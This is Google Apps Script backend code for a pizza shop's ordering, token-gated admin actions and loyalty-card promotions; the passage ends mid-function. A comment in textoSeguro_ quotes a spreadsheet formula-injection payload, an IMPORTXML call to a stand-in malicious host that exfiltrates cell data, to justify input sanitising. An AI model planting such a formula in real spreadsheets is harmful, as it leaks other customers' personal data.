/**
 * Mextizza — puente entre la web/app/captura manual y un Google Sheet que
 * actúa como base de datos, más el Centro de Ventas (SalesCenter.dc.html).
 *
 * Cómo instalarlo:
 * 1. Crea un Google Sheet nuevo llamado "Mextizza — Operación".
 * 2. En el Sheet: Extensiones → Apps Script. Borra el contenido de Code.gs
 *    que viene por defecto y pega TODO este archivo.
 * 3. Corre la función `configurarHojas` una vez (menú Ejecutar → configurarHojas).
 *    Te va a pedir autorización — es tu propio Sheet, es seguro aceptar.
 *    Esto crea las 6 pestañas con sus encabezados.
 * 4. Corre `configurarToken` UNA vez (token público, va en la web y la app) y
 *    `configurarTokenAdmin` UNA vez (token de administrador, solo para el
 *    Centro de Ventas). Revisa el log de ejecución para verlos, o ve a
 *    Configuración del proyecto → Propiedades del script.
 *    El token público solo puede crear pedidos, pedir catering y consultar el
 *    estado de un folio. Listar pedidos, avanzar estado y cancelar exigen el
 *    token de administrador.
 * 5. Despliega: Implementar → Nueva implementación → tipo "Aplicación web".
 *    - Ejecutar como: Yo (tu cuenta)
 *    - Quién tiene acceso: Cualquier usuario
 *    Copia la URL que te da — esa es la que conecta la web, la app y el
 *    Centro de Ventas con este Sheet.
 * 6. Cada vez que edites este código, tienes que crear una NUEVA versión de
 *    la implementación (Implementar → Administrar implementaciones → editar
 *    → Nueva versión) para que los cambios surtan efecto en la URL pública.
 */

const SHEETS = {
  ordenes: 'ordenes',
  ordenItems: 'orden_items',
  itemComplementos: 'item_complementos',
  productos: 'productos',
  complementos: 'complementos',
  clientes: 'clientes',
  catering: 'catering'
};

const ESTADOS_ACTIVOS = ['recibida', 'confirmada', 'horno', 'lista', 'camino'];

/* El recorrido de un pedido. Quien pasa a recoger no tiene un 'en camino': su
   pizza se queda lista en la cocina hasta que llega por ella. Meterle ese paso
   obligaba a la cocina a marcar que salio algo que nunca sale. */
const FLUJO_DOMICILIO = ['recibida', 'confirmada', 'horno', 'lista', 'camino', 'entregada'];
const FLUJO_PICKUP = ['recibida', 'confirmada', 'horno', 'lista', 'entregada'];
function flujoDe_(entregaTipo) {
  return entregaTipo === 'pickup' ? FLUJO_PICKUP : FLUJO_DOMICILIO;
}
const TS_POR_ESTADO = {
  confirmada: 't_confirmada',
  horno: 't_horno',
  lista: 't_lista',
  camino: 't_camino',
  entregada: 't_entregada'
};

const ORDENES_HEADERS = ['folio', 'canal', 'estado', 'cliente_telefono', 'cliente_nombre', 'direccion', 'colonia', 'km', 'pago_metodo', 'pago_estado', 'subtotal', 'total', 't_recibida', 't_confirmada', 't_horno', 't_lista', 't_camino', 't_entregada', 'reparto', 'notas', 'motivo_cancelacion', 'entrega_tipo', 'descuento', 'sello', 'premio'];
const ORDEN_ITEMS_HEADERS = ['linea_id', 'folio', 'producto_id', 'producto_nombre', 'cantidad', 'precio_unit', 'complementos_total', 'importe', 'promocion'];
const ITEM_COMPLEMENTOS_HEADERS = ['linea_id', 'complemento_id', 'complemento_nombre', 'precio'];
const PRODUCTOS_HEADERS = ['id', 'nombre', 'descripcion', 'categoria', 'precio', 'activo', 'foto'];
const COMPLEMENTOS_HEADERS = ['id', 'nombre', 'grupo', 'precio', 'activo'];
const CLIENTES_HEADERS = ['telefono', 'nombre', 'direccion', 'colonia', 'notas', 'pedidos', 'dias_ciclo', 'ultimo_dia', 'brownie_usado', 'pizza_usada', 'ciclos', 'brownie_guardado'];
const CATERING_HEADERS = ['folio', 'nombre', 'telefono', 'personas', 'fecha_evento', 'notas', 'estado', 'creado_en'];

/** Corre esto UNA vez para crear las 6 pestañas con encabezados. No borra datos si ya existen. */
function configurarHojas() {
  const ss = SpreadsheetApp.getActiveSpreadsheet();
  const specs = [
    [SHEETS.ordenes, ORDENES_HEADERS],
    [SHEETS.ordenItems, ORDEN_ITEMS_HEADERS],
    [SHEETS.itemComplementos, ITEM_COMPLEMENTOS_HEADERS],
    [SHEETS.productos, PRODUCTOS_HEADERS],
    [SHEETS.complementos, COMPLEMENTOS_HEADERS],
    [SHEETS.clientes, CLIENTES_HEADERS],
    [SHEETS.catering, CATERING_HEADERS]
  ];
  specs.forEach(([nombre, headers]) => {
    let sh = ss.getSheetByName(nombre);
    if (!sh) sh = ss.insertSheet(nombre);
    if (sh.getLastRow() === 0) {
      sh.getRange(1, 1, 1, headers.length).setValues([headers]);
      sh.setFrozenRows(1);
      return;
    }
    /* La hoja ya tiene datos. Las columnas nuevas (las de la tarjeta, por
       ejemplo) se agregan SIEMPRE al final de la constante, nunca en medio, asi
       que basta con escribir los encabezados que faltan a la derecha: las filas
       existentes no se mueven y quedan con esas celdas vacias, que se leen
       como cero. */
    const actuales = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
    for (let i = 0; i < actuales.length; i++) {
      if (String(actuales[i]) !== headers[i]) {
        throw new Error('La hoja ' + nombre + ' tiene la columna ' + (i + 1) +
          ' como "' + actuales[i] + '" y el codigo espera "' + headers[i] +
          '". Revisala a mano antes de seguir: mover columnas corrompe los datos.');
      }
    }
    if (actuales.length < headers.length) {
      const faltan = headers.slice(actuales.length);
      sh.getRange(1, actuales.length + 1, 1, faltan.length).setValues([faltan]);
      Logger.log(nombre + ': columnas agregadas -> ' + faltan.join(', '));
    }
  });
  const def = ss.getSheetByName('Sheet1') || ss.getSheetByName('Hoja 1');
  if (def && def.getLastRow() === 0 && ss.getSheets().length > 6) ss.deleteSheet(def);
}

/** Corre esto UNA vez, con tu direccion, para habilitar el recoger en cocina.
 *  Se guarda en las propiedades del script y NO en el codigo: este archivo
 *  vive en un repositorio publico y la direccion es un domicilio particular. */
function configurarPickup() {
  const DIRECCION = 'PEGA AQUI TU DIRECCION, CORRE LA FUNCION, Y BORRA ESTA LINEA';
  if (DIRECCION.indexOf('PEGA AQUI') === 0) {
    throw new Error('Edita la constante DIRECCION dentro de configurarPickup() antes de correrla.');
  }
  PropertiesService.getScriptProperties().setProperty('DIRECCION_PICKUP', DIRECCION);
  Logger.log('Direccion de recoleccion guardada. Ya puedes borrarla de esta funcion.');
}

/** Corre esto UNA vez para generar el token PÚBLICO (el que va en la web y la app). */
function configurarToken() {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('TOKEN')) {
    Logger.log('Ya existe un token público: ' + props.getProperty('TOKEN'));
    return;
  }
  const token = Utilities.getUuid();
  props.setProperty('TOKEN', token);
  Logger.log('Token público generado — va en ui_kits/sheets-config.js: ' + token);
}

/** Corre esto UNA vez para generar el token de ADMINISTRADOR (solo Centro de Ventas).
 *  Este NO debe escribirse en ningún archivo del repo: se pega a mano en el
 *  Centro de Ventas la primera vez y se queda guardado en ese navegador. */
function configurarTokenAdmin() {
  const props = PropertiesService.getScriptProperties();
  if (props.getProperty('TOKEN_ADMIN')) {
    Logger.log('Ya existe un token admin: ' + props.getProperty('TOKEN_ADMIN'));
    return;
  }
  const token = Utilities.getUuid();
  props.setProperty('TOKEN_ADMIN', token);
  Logger.log('Token ADMIN generado — pégalo solo en el Centro de Ventas: ' + token);
}

/** Genera un token público nuevo e invalida el anterior. Úsalo cuando el token
 *  viejo se haya filtrado (siempre está expuesto en el JS, así que rótalo si
 *  alguna vez tuvo permisos de más). Después hay que actualizarlo en
 *  ui_kits/sheets-config.js y volver a desplegar la web y la app. */
function rotarTokenPublico() {
  const props = PropertiesService.getScriptProperties();
  const nuevo = Utilities.getUuid();
  props.setProperty('TOKEN', nuevo);
  Logger.log('Token público NUEVO (actualízalo en sheets-config.js): ' + nuevo);
}

/* Dos tokens con permisos distintos.
 *
 *   TOKEN        (público)  — viaja dentro de la web y del APK, así que cualquiera
 *                            puede leerlo. Solo sirve para acciones de cliente:
 *                            crear un pedido, pedir catering y consultar el estado
 *                            de UN folio.
 *   TOKEN_ADMIN  (privado)  — solo vive en el Centro de Ventas. Habilita listar
 *                            pedidos (que incluyen nombre y dirección de clientes),
 *                            avanzar estado y cancelar.
 *
 * Antes había un solo token para todo: como se publica junto al código del
 * cliente, cualquiera podía descargarlo y listar los datos personales de todos
 * los pedidos del día, o cancelarlos. */
function checkToken_(token) {
  const publico = PropertiesService.getScriptProperties().getProperty('TOKEN');
  const admin = PropertiesService.getScriptProperties().getProperty('TOKEN_ADMIN');
  if (!token) throw new Error('Token inválido');
  if (token === publico) return 'publico';
  if (admin && token === admin) return 'admin';
  throw new Error('Token inválido');
}

/** Acciones que exponen datos personales o modifican pedidos ajenos. */
function requiereAdmin_(nivel) {
  if (nivel !== 'admin') throw new Error('No autorizado para esta acción');
}

/* Google Sheets evalua como formula cualquier celda cuyo texto empiece con
 * = + - @ (o tab/retorno). Como el nombre, la direccion y las notas los escribe
 * el cliente desde la web o la app, un pedido con el nombre
 * =IMPORTXML("https://sitio-malo.com?d="&A1,"//a") se ejecutaria al abrir el
 * Sheet y podria filtrar datos de otros clientes hacia afuera.
 * Anteponer un apostrofo obliga a Sheets a tratarlo como texto; el apostrofo no
 * se ve al leer la celda. */
function textoSeguro_(v) {
  if (v === null || v === undefined) return "";
  var s = String(v);
  var c = s.charCodeAt(0);
  // 61 =   43 +   45 -   64 @   9 tabulador   13 retorno de carro
  if (c === 61 || c === 43 || c === 45 || c === 64 || c === 9 || c === 13) {
    return String.fromCharCode(39) + s;
  }
  return s;
}

function sheet_(nombre) {
  return SpreadsheetApp.getActiveSpreadsheet().getSheetByName(nombre);
}

function rowsAsObjects_(sh) {
  const values = sh.getDataRange().getValues();
  const headers = values.shift();
  return values.map(row => {
    const o = {};
    headers.forEach((h, i) => { o[h] = row[i]; });
    return o;
  });
}

/* Sufijo aleatorio para el folio. Sin I, O, 0 ni 1 para que nadie los
 * confunda al dictarlos por telefono. 32^5 = ~33 millones de combinaciones. */
function sufijoAleatorio_() {
  var abc = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
  var out = "";
  for (var i = 0; i < 5; i++) {
    out += abc.charAt(Math.floor(Math.random() * abc.length));
  }
  return out;
}

function nextFolio_() {
  var sh = sheet_(SHEETS.ordenes);
  var n = sh.getLastRow(); // incluye encabezado, arranca en MX-0001 con la primera orden
  /* El numero sigue siendo secuencial para que sea util en la operacion, pero
   * lleva un sufijo aleatorio: el endpoint `estado` es publico por diseño, y sin
   * el sufijo cualquiera podia recorrer MX-0001, MX-0002... y leer el estado y el
   * total de todos los pedidos. */
  return "MX-" + String(n).padStart(4, "0") + "-" + sufijoAleatorio_();
}

/** Punto de entrada para escrituras: crear orden, avanzar estado, cancelar. */
function doPost(e) {
  const lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    const body = JSON.parse(e.postData.contents);
    const nivel = checkToken_(body.token);

    let result;
    switch (body.action) {
      case 'crear_orden':
        result = crearOrden_(body);
        break;
      case 'avanzar_estado':
        requiereAdmin_(nivel);
        result = avanzarEstado_(body);
        break;
      case 'cancelar':
        requiereAdmin_(nivel);
        result = cancelarOrden_(body);
        break;
      case 'solicitar_catering':
        result = crearSolicitudCatering_(body);
        break;
      default:
        throw new Error('Acción desconocida: ' + body.action);
    }
    return jsonOut_({ ok: true, ...result });
  } catch (err) {
    return jsonOut_({ ok: false, error: String(err) });
  } finally {
    lock.releaseLock();
  }
}

/** Punto de entrada para lecturas: el Centro de Ventas pide las órdenes abiertas. */
function doGet(e) {
  try {
    const token = e.parameter.token;
    const nivel = checkToken_(token);
    if (e.parameter.action === 'listar_abiertas') {
      requiereAdmin_(nivel);
      return jsonOut_({ ok: true, ordenes: listarAbiertas_() });
    }
    if (e.parameter.action === 'listar_hoy') {
      requiereAdmin_(nivel);
      return jsonOut_({ ok: true, ordenes: listarHoy_() });
    }
    /* La tarjeta la consultan la web y la app para pintar el progreso. Va con
       token publico: es el propio cliente preguntando por su telefono, la misma
       exposicion que estado_por_telefono, que ya existia. */
    /* Datos para recoger en la cocina. La direccion vive en las propiedades del
       script, no en el codigo: el repositorio es publico y es un domicilio
       particular. Va con token publico porque el cliente la necesita para
       decidir, antes de tener un folio. */
    if (e.parameter.action === 'pickup') {
      return jsonOut_({ ok: true, direccion: direccionPickup_(), descuento: PICKUP_DESCUENTO });
    }
    if (e.parameter.action === 'tarjeta') {
      return jsonOut_({
        ok: true,
        tarjeta: premiosDe_(leerTarjeta_(e.parameter.telefono),
          premiosReservados_(e.parameter.telefono)),
        dosPorUno: es2x1_(),
      });
    }
    if (e.parameter.action === 'estado_por_telefono') {
      return jsonOut_({ ok: true, orden: estadoPorTelefono_(e.parameter.telefono) });
    }
    if (e.parameter.action === 'estado') {
      return jsonOut_({ ok: true, orden: estadoOrden_(e.parameter.folio) });
    }
    if (e.parameter.action === 'catalogo') {
      return jsonOut_({ ok: true, productos: rowsAsObjects_(sheet_(SHEETS.productos)), complementos: rowsAsObjects_(sheet_(SHEETS.complementos)) });
    }
    throw new Error('Acción desconocida: ' + e.parameter.action);
  } catch (err) {
    return jsonOut_({ ok: false, error: String(err) });
  }
}

function jsonOut_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(ContentService.MimeType.JSON);
}

/**
 * body: { token, canal, cliente:{telefono,nombre}, direccion, colonia, km,
 *         pago_metodo, notas, items:[{producto_id,nombre,cantidad,precio_unit,
 *         addons:[{id,nombre,precio}]}], estadoInicial }
 */
// <catalogo:inicio>
/* GENERADO por scripts/build-catalogo.js desde ui_kits/menu-data.js.
   No editar a mano: el build lo reescribe y descarta los cambios.
   Para cambiar un precio, cambialo en menu-data.js y vuelve a construir. */
const CATALOGO = {
  productos: {
    'serranita': { nombre: 'Pizza Serranita', precio: 229, cat: 'Del horno' },
    'aloha': { nombre: 'Pizza Aloha', precio: 189, cat: 'Del horno' },
    'newyork': { nombre: 'Pizza Newyork', precio: 199, cat: 'Del horno' },
    'provola': { nombre: 'Pizza Provola', precio: 229, cat: 'Del horno' },
    'chisi': { nombre: 'Pizza Chisi', precio: 219, cat: 'Del horno' },
    'combinada': { nombre: 'Pizza Combinada', precio: 229, cat: 'Del horno' },
    'roni': { nombre: 'Pizza Roni', precio: 189, cat: 'Del horno' },
    'traviesa': { nombre: 'Pizza Traviesa', precio: 199, cat: 'Del horno' },
    'cochinita': { nombre: 'Pizza Cochinita', precio: 229, cat: 'Rotativa' },
    'chocolatoso': { nombre: 'Brownie', precio: 40, cat: 'Para cerrar' },
    'refresco-coca': { nombre: 'Refresco Coca-Cola', precio: 35, cat: 'Para cerrar' },
    'refresco-sprite': { nombre: 'Refresco Sprite', precio: 35, cat: 'Para cerrar' },
    'agua': { nombre: 'Agua Mineral', precio: 35, cat: 'Para cerrar' },
  },
  complementos: {
    'provolone': { nombre: 'Extra provolone', precio: 55 },
    'monterrey': { nombre: 'Extra queso monterrey', precio: 30 },
    'gorgonzola': { nombre: 'Extra gorgonzola', precio: 30 },
    'parmesano': { nombre: 'Extra parmesano', precio: 20 },
    'peperoni': { nombre: 'Extra peperoni', precio: 45 },
    'serrano': { nombre: 'Extra jamón serrano', precio: 45 },
    'jamon': { nombre: 'Extra jamón', precio: 20 },
    'pina': { nombre: 'Extra piña', precio: 20 },
    'arugula': { nombre: 'Extra arúgula', precio: 15 },
    'morada': { nombre: 'Extra cebolla morada encurtida', precio: 15 },
    'champinones': { nombre: 'Extra champiñones', precio: 15 },
    'miel': { nombre: 'Drizzle de miel', precio: 15 },
    'habanero': { nombre: 'Toque de salsa habanero', precio: 15 },
    'macha': { nombre: 'Toque de salsa macha', precio: 15 },
    'aoev': { nombre: 'Terminado con aceite de oliva extra virgen', precio: 15 },
  },
};
// <catalogo:fin>

/* Tarjeta de recompensas y promocion del viernes.

   Se cuentan DIAS DISTINTOS con pedido, no pedidos: dos ordenes el mismo dia
   valen una. Sin eso, cuatro pedidos seguidos en una tarde regalan un brownie.

   Al canjear la pizza el ciclo se reinicia restando 9, no poniendo cero: si
   alguien llego al dia 12 sin canjear, no pierde los tres que le sobran.

   Todo se decide AQUI, nunca en el navegador. El cliente puede pedir un premio;
   el servidor comprueba si de verdad lo tiene. */
const PREMIOS = {
  brownie: { dia: 4, producto: 'chocolatoso' },
  pizza:   { dia: 9, producto: 'traviesa' },
};

function hoyCDMX_(d) {
  return Utilities.formatDate(d || new Date(), 'America/Mexico_City', 'yyyy-MM-dd');
}

/* Viernes despues de las 7. El dia se lee en hora de Mexico, no del servidor. */
function es2x1_(d) {
  const f = d || new Date();
  const dia = Number(Utilities.formatDate(f, 'America/Mexico_City', 'u')) % 7; // 5 = viernes
  const hora = Number(Utilities.formatDate(f, 'America/Mexico_City', 'H'));
  return dia === 5 && hora >= 19;
}

/* Una pizza es cualquier cosa que salga del horno: 'Del horno' y la 'Rotativa'
   del mes. 'Para cerrar' son el brownie, los refrescos y el agua.

   Esta distincion sostiene toda la mecanica de premios: el sello se gana con
   una pizza COBRADA. Sin eso, nueve pedidos de agua de $35 valen una pizza
   gratis y el programa de lealtad se vuelve una forma de perder dinero. */
/* Recoger en la cocina. El descuento sustituye un reparto que no se hizo, asi
   que es fijo por pedido y no por pizza: el viaje ahorrado es uno solo.

   La DIRECCION no se escribe aqui. Este archivo vive en un repositorio publico,
   y es un domicilio particular: quedaria indexado y en el historial de git para
   siempre. Se guarda con configurarPickup() en las propiedades del script, del
   mismo modo que los tokens, y se sirve por el API. */
const PICKUP_DESCUENTO = 30;

function direccionPickup_() {
  return PropertiesService.getScriptProperties().getProperty('DIRECCION_PICKUP') || '';
}

function esPizza_(linea) {
  return linea.cat !== 'Para cerrar';
}

/* El pedido trae al menos una pizza que si se esta cobrando. Vale para ganar el
   sello y para poder canjear: un pedido de puro premio sale en cero y el
   reparto lo terminamos pagando nosotros. */
function tienePizzaPagada_(lineas) {
  return lineas.some(function (l) { return esPizza_(l) && !l.promocion; });
}

function precioProducto_(id) {
  const p = CATALOGO.productos[String(id)];
  if (!p) throw new Error('Producto desconocido: ' + id);
  return p;
}

/* El horario tambien se valida AQUI, no solo en el navegador.

   Una orden entro a la 1:27 de la manana con el candado del frontend ya puesto:
   basta un cliente desactualizado (una app instalada antes del arreglo, una
   pestana abierta desde antes del despliegue) para brincarselo. Y el token
   publico viaja en la web y dentro del APK, asi que cualquiera puede llamar a
   crear_orden directo. Una validacion que solo vive en el frontend es una
   comodidad de interfaz, no una regla.

   OJO: estos valores estan duplicados a proposito desde MEXTIZZA_FACTS.horario
   en ui_kits/menu-data.js, porque Apps Script no puede leer ese archivo. Si
   cambias uno tienes que cambiar el otro; scripts/build-js.js compara los dos y
   detiene el build si dejan de coincidir. */
const HORARIO = { dias: [3, 4, 5, 6, 0], desde: 16, hasta: 23 };

function estaAbierto_(ahora) {
  const d = ahora || new Date();
  // Siempre en hora de Ciudad de Mexico: el servidor de Apps Script puede
  // estar en cualquier huso, y el reloj del cliente no es de fiar.
  const dia = Number(Utilities.formatDate(d, 'America/Mexico_City', 'u')) % 7; // 1=lun..7=dom -> 0=dom
  const hora = Number(Utilities.formatDate(d, 'America/Mexico_City', 'H'));
  return HORARIO.dias.indexOf(dia) !== -1 && hora >= HORARIO.desde && hora < HORARIO.hasta;
}

function crearOrden_(body) {
  if (!estaAbierto_()) {
    throw new Error('La cocina esta cerrada. Tomamos pedidos de miercoles a domingo, de 4:00 pm a 11:00 pm.');
  }
  const now = new Date();
  const telefono = body.cliente && body.cliente.telefono;

  /* Los precios salen del CATALOGO, no del cuerpo de la peticion. Antes se
     usaba it.precio_unit tal cual: con recompensas de por medio, confiar en el
     cliente es invitar a que pida ocho pizzas en cero. */
  const lineas = (body.items || []).map(function (it) {
    const prod = precioProducto_(it.producto_id);
    /* Con id, el precio sale del catalogo. Sin id, se acepta el que manda el
       cliente: los carritos viejos (y los APK ya instalados) mandan los
       complementos colapsados en un solo renglon con el nombre concatenado y
       sin id, y rechazarlos tumbaria pedidos reales. No es un hueco: un
       complemento solo SUMA, y el minimo es cero, asi que lo peor que puede
       hacer alguien manipulando ese campo es pagar de mas. El producto, que es
       donde esta el dinero, si se cotiza siempre contra el catalogo. */
    const addons = (it.addons || []).map(function (a) {
      const c = a.id ? CATALOGO.complementos[String(a.id)] : null;
      if (a.id && !c) throw new Error('Complemento desconocido: ' + a.id);
      return {
        id: a.id ? String(a.id) : '',
        nombre: c ? c.nombre : String(a.nombre || 'complemento'),
        precio: c ? c.precio : Math.max(0, Number(a.precio) || 0)
      };
    });
    return {
      producto_id: String(it.producto_id),
      nombre: prod.nombre,
      cat: prod.cat,
      cantidad: Math.max(1, Number(it.cantidad) || 1),
      precio_unit: prod.precio,
      complementos: addons,
      complementosTotal: addons.reduce(function (t, a) { return t + a.precio; }, 0),
      promocion: ''
    };
  });
  if (!lineas.length) throw new Error('El pedido va vacio');

  const premio = aplicarPromos_(lineas, telefono, body.usarPremio, now);

  const folio = nextFolio_();
  const estado = body.estadoInicial === 'confirmada' ? 'confirmada' : 'recibida';
  const itemsSh = sheet_(SHEETS.ordenItems);
  const addonsSh = sheet_(SHEETS.itemComplementos);
  let subtotal = 0;

  lineas.forEach(function (l, i) {
    const lineaId = folio + '-' + (i + 1);
    // Una linea regalada conserva su precio_unit para saber cuanto se regalo,
    // pero su importe es 0: la cocina la hace y el corte no la cobra.
    const importe = l.promocion ? 0 : (l.precio_unit + l.complementosTotal) * l.cantidad;
    subtotal += importe;
    itemsSh.appendRow([lineaId, folio, textoSeguro_(l.producto_id), textoSeguro_(l.nombre),
      l.cantidad, l.precio_unit, l.complementosTotal, importe, textoSeguro_(l.promocion)]);
    l.complementos.forEach(function (a) {
      addonsSh.appendRow([lineaId, textoSeguro_(a.id), textoSeguro_(a.nombre), a.precio]);
    });
  });

  /* Recoger en la cocina: se descuenta un reparto que no se va a hacer. Se pide
     que haya una pizza cobrada, o un pedido de un agua de $35 saldria en $5. */
  const pickup = body.entrega_tipo === 'pickup';
  const hayPizza = tienePizzaPagada_(lineas);
  const descuento = (pickup && hayPizza) ? Math.min(PICKUP_DESCUENTO, subtotal) : 0;
  const total = subtotal - descuento;

  const ordenesSh = sheet_(SHEETS.ordenes);
  const row = {
    folio: folio, canal: body.canal, estado: estado,
    cliente_telefono: textoSeguro_(telefono),
    cliente_nombre: textoSeguro_(body.cliente && body.cliente.nombre),
    // En pickup no hay direccion que guardar: la del cliente no hace falta.
    direccion: pickup ? '' : textoSeguro_(body.direccion),
    colonia: pickup ? '' : textoSeguro_(body.colonia),
    km: pickup ? '' : body.km,
    pago_metodo: textoSeguro_(body.pago_metodo), pago_estado: 'pendiente',
    subtotal: subtotal, total: total, reparto: 0,
    notas: textoSeguro_(body.notas), motivo_cancelacion: '',
    t_recibida: now, t_confirmada: '', t_horno: '', t_lista: '', t_camino: '', t_entregada: '',
    entrega_tipo: pickup ? 'pickup' : 'domicilio',
    descuento: descuento,
    /* 'pendiente' significa: este pedido sellara la tarjeta cuando se entregue.
       Hasta entonces no se toca nada del cliente. */
    sello: hayPizza ? 'pendiente' : 'no',
    premio: premio ? premio.tipo : ''
  };
  ordenesSh.appendRow(ORDENES_HEADERS.map(function (h) { return row[h]; }));

  upsertCliente_(body.cliente, pickup ? '' : body.direccion, pickup ? '' : body.colonia);

  /* La tarjeta NO se mueve aqui. Se devuelve como esta, mas el aviso de que este
     pedido sella al entregarse: prometer el sello antes de entregar es lo que
     hacia que un pedido cancelado contara. */
  const tarjeta = premiosDe_(leerTarjeta_(telefono), premiosReservados_(telefono));

  return {
    folio: folio, premio: premio, tarjeta: tarjeta,
    selloPendiente: hayPizza,
    entrega_tipo: row.entrega_tipo,
    descuento: descuento,
    total: total,
    direccionPickup: pickup ? direccionPickup_() : ''
  };
}

/* Lee la tarjeta de un telefono. Devuelve el estado ANTES del pedido en curso,
   que es lo que decide si hay premio disponible. */
function leerTarjeta_(telefono) {
  const vacia = { dias: 0, ultimoDia: '', brownieUsado: false, pizzaUsada: false, ciclos: 0, brownieGuardado: false };
  if (!telefono) return vacia;
  const sh = sheet_(SHEETS.clientes);
  const data = sh.getDataRange().getValues();
  const c = CLIENTES_HEADERS;
  for (let r = 1; r < data.length; r++) {
    if (String(data[r][0]) !== String(telefono)) continue;
    return {
      fila: r + 1,
      dias: Number(data[r][c.indexOf('dias_ciclo')]) || 0,
      ultimoDia: String(data[r][c.indexOf('ultimo_dia')] || ''),
      brownieUsado: data[r][c.indexOf('brownie_usado')] === true || data[r][c.indexOf('brownie_usado')] === 'si',
      pizzaUsada: data[r][c.indexOf('pizza_usada')] === true || data[r][c.indexOf('pizza_usada')] === 'si',
      ciclos: Number(data[r][c.indexOf('ciclos')]) || 0,
      brownieGuardado: data[r][c.indexOf('brownie_guardado')] === true || data[r][c.indexOf('brownie_guardado')] === 'si'
    };
  }
  return vacia;
}

/* Que premios tiene disponibles hoy, segun los dias acumulados. */
/* Premios que ya estan comprometidos por un pedido en curso. La tarjeta se
   descuenta hasta que el pedido se ENTREGA, asi que entre pedir y entregar el
   premio sigue viendose disponible: sin esto, dos pedidos seguidos antes de que
   llegue el primero se llevan dos pizzas gratis. */
function premiosReservados_(telefono) {
  const r = { brownie: false, pizza: false };
  if (!telefono) return r;
  const sh = sheet_(SHEETS.ordenes);
  const data = sh.getDataRange().getValues();
  const cTel = ORDENES_HEADERS.indexOf('cliente_telefono');
  const cSello = ORDENES_HEADERS.indexOf('sello');
  const cPremio = ORDENES_HEADERS.indexOf('premio');
  for (let i = 1; i < data.length; i++) {
    if (String(data[i][cTel]) !== String(telefono)) continue;
    if (data[i][cSello] !== 'pendiente') continue;
    const pr = String(data[i][cPremio] || '');
    if (pr === 'tarjeta:brownie') r.brownie = true;
    if (pr === 'tarjeta:pizza') r.pizza = true;
  }
  return r;
}

function premiosDe_(t, reservados) {
  const res = reservados || { brownie: false, pizza: false };
  return {
    dias: t.dias,
    // Un brownie guardado viene de una tarjeta anterior que se cerro sin
    // reclamarlo. Vale aunque la tarjeta nueva apenas vaya empezando.
    // `res` son los premios ya comprometidos por un pedido que va en camino.
    brownie: !res.brownie && (t.brownieGuardado || (t.dias >= PREMIOS.brownie.dia && !t.brownieUsado)),
    pizza: !res.pizza && (t.dias >= PREMIOS.pizza.dia && !t.pizzaUsada),
    faltanBrownie: Math.max(0, PREMIOS.brownie.dia - t.dias),
    faltanPizza: Math.max(0, PREMIOS.pizza.dia - t.dias),
    ciclos: t.ciclos
  };
}

/* Decide que se regala. Las promociones NO se acumulan: se aplica la que mas le
   conviene al cliente, y se dice cual fue. */
function aplicarPromos_(lineas, telefono, usarPremio, ahora) {
  /* Con las reservas restadas: un premio comprometido por un pedido que aun no
     se entrega no se puede volver a pedir. Sin esto, dos pedidos seguidos antes
     de que llegue el primero se llevaban dos pizzas gratis. */
  const disp = premiosDe_(leerTarjeta_(telefono), premiosReservados_(telefono));
  const opciones = [];

  // 2x1 del viernes: gratis la mas barata del par, una por pedido. Postres y
  // bebidas no cuentan: la promocion es de pizzas.
  const pizzas = [];
  lineas.forEach(function (l, idx) {
    if (!esPizza_(l)) return;
    for (let n = 0; n < l.cantidad; n++) pizzas.push({ idx: idx, precio: l.precio_unit });
  });
  if (es2x1_(ahora) && pizzas.length >= 2) {
    const barata = pizzas.slice().sort(function (a, b) { return a.precio - b.precio; })[0];
    opciones.push({ tipo: '2x1', idx: barata.idx, valor: barata.precio });
  }

  /* Premios de la tarjeta: el cliente los pidio, de verdad los tiene, y DESPUES
     de regalar la linea sigue quedando una pizza cobrada.

     Lo ultimo no es lo mismo que 'hay una pizza en el pedido': un pedido de pura
     Traviesa gratis tiene una pizza y sale en cero, con el reparto pagado por
     nosotros. Por eso se mira si queda OTRA pizza cobrada, o si a la misma linea
     le sobran unidades. */
  const quedaPizzaPagada = function (idx) {
    return lineas.some(function (l, j) {
      if (!esPizza_(l) || l.promocion) return false;
      return j !== idx || l.cantidad > 1;
    });
  };
  if (usarPremio === 'pizza' && disp.pizza) {
    const i = indiceDe_(lineas, PREMIOS.pizza.producto);
    if (i >= 0 && quedaPizzaPagada(i)) opciones.push({ tipo: 'tarjeta:pizza', idx: i, valor: lineas[i].precio_unit });
  }
  if (usarPremio === 'brownie' && disp.brownie) {
    const i = indiceDe_(lineas, PREMIOS.brownie.producto);
    if (i >= 0 && quedaPizzaPagada(i)) opciones.push({ tipo: 'tarjeta:brownie', idx: i, valor: lineas[i].precio_unit });
  }

  if (!opciones.length) return null;
  opciones.sort(function (a, b) { return b.valor - a.valor; });
  const gana = opciones[0];

  // Si la linea trae varias unidades se parte: una gratis, el resto se cobra.
  const l = lineas[gana.idx];
  if (l.cantidad > 1) {
    l.cantidad -= 1;
    lineas.push({
      producto_id: l.producto_id, nombre: l.nombre, cat: l.cat, cantidad: 1,
      precio_unit: l.precio_unit, complementos: [], complementosTotal: 0,
      promocion: gana.tipo
    });
  } else {
    l.promocion = gana.tipo;
  }
  return { tipo: gana.tipo, producto: l.nombre, valor: gana.valor };
}

function indiceDe_(lineas, productoId) {
  for (let i = 0; i < lineas.length; i++) {
    if (lineas[i].producto_id === productoId && !lineas[i].promocion) return i;
  }
  return -1;
}

/* Cuenta el dia y aplica el canje. Dias DISTINTOS: si ya hubo pedido hoy, no
   suma. Al canjear la pizza el ciclo resta 9 en vez de irse a cero, para no
   castigar a quien acumulo de mas antes de canjear. */
/* Liquida la tarjeta de un pedido: suma el sello y gasta el premio.

   Corre al ENTREGAR, no al pedir. Un pedido que se cancela o que nunca avanza
   no vale: antes sellaba en cuanto entraba, asi que una cancelacion dejaba el
   sello puesto y el premio gastado. Entre pedir y entregar el premio queda
   apartado por premiosReservados_, para que no se pida dos veces.

   premioTipo llega como texto desde la columna `premio` del pedido
   ('tarjeta:brownie', 'tarjeta:pizza', '2x1' o vacio). */
function liquidarPedido_(telefono, premioTipo, ahora, ganaSello) {
  if (!telefono) return null;
  const sh = sheet_(SHEETS.clientes);
  const t = leerTarjeta_(telefono);
  const hoy = hoyCDMX_(ahora);
  const c = CLIENTES_HEADERS;

  let dias = t.dias;
